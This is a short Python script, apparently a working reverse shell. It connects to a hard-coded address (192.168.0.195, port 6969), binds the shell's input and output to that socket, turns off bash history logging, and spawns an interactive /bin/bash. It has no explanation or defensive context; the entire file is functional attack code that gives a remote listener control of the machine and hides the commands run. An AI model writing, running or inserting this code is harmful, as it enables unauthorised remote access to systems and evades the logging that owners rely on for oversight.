import socket
import os
import pty

HOST = '192.168.0.195'
PORT = 6969

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
os.putenv("HISTFILE", '/dev/null')
pty.spawn("/bin/bash")
